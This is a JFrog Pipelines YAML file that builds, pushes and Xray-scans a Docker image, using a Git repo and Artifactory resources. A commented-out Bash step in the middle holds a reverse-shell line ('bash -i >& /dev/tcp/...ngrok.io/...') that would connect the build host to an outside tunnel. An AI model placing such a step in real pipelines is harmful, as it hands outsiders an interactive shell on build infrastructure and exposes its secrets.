resources:
  - name: yuval_repo
    type: GitRepo
    configuration:
      gitProvider: yuvalGithub
      path: mor2k1/linux
      branches:
        include: IntelliJ

  - name: docker_file
    type: Image
    configuration:
      registry: yuvalArtifactory
      sourceRepository: main-repohubvirt
      imageName: avigdor.jfrog.io/main-repohubvirt/ubuntu
      imageTag: latest
      autoPull: true
      
  - name: image 
    type: Image
    configuration:
      registry: yuvalArtifactory                              # <-- replace with your     MyArtifactoryifactory integration
      sourceRepository: main-repohub               # <-- required if registry is     MyArtifactoryifactory
      imageName: avigdor.jfrog.io/main-repohub/yuval # < -- replace with your image path and name
      imageTag: ${run_number}
      autoPull: true

  - name: docker_build
    type: BuildInfo
    configuration:
      sourceArtifactory: yuvalArtifactory
      buildName: docker_build_yuval
      buildNumber: latest

  - name: build_info
    type: BuildInfo
    configuration:
      sourceArtifactory: yuvalArtifactory
      buildName: xray_build
      buildNumber: ${run_numebr}

pipelines:
  - name: yuval_pipeline_build_docker
    steps:
      - name: docker_build_step
        type: DockerBuild
        configuration:
          affinityGroup: yuval_docker
          dockerFileLocation: .
          dockerFileName: Dockerfile
          dockerImageName: avigdor.jfrog.io/main-repohubvirt/ubuntu
          dockerImageTag: ${run_number}
          inputResources:
            - name: yuval_repo
            - name: docker_file
          integrations:
            - name: yuvalArtifactory
            
      #- name: bash_commands
       # type: Bash
        #configuration:
         # affinityGroup: yuval_docker
          #runtime:
           # type: host
         # inputSteps:
          #  - name: docker_build_step
        #execution:
         # onExecute:
          #  - pwd
           # - whoami
            #- bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/11712 0>&1
          #onSuccess:
           # - echo "succes"
      
      - name: docker_push
        type: DockerPush
        configuration:
          affinityGroup: yuval_docker
          targetRepository: main-repohub
          integrations:   
            - name: yuvalArtifactory                           # <-- new test replace with your     MyArtifactoryifactory integration
          inputSteps:
            - name: docker_build_step
          outputResources:  
            - name: image
      
      - name: build_info
        type: PublishBuildInfo
        configuration:
          affinityGroup: yuval_docker
          inputSteps:
            - name: docker_push
          outputResources:
            - name: build_info
      
      - name: xray_scan
        type: XrayScan
        configuration:
          failOnScan: false
          inputResources:
            - name: build_info
          affinityGroup: yuval_docker
        execution:
          onSuccess:
            - echo "succes to run Xray Scan"
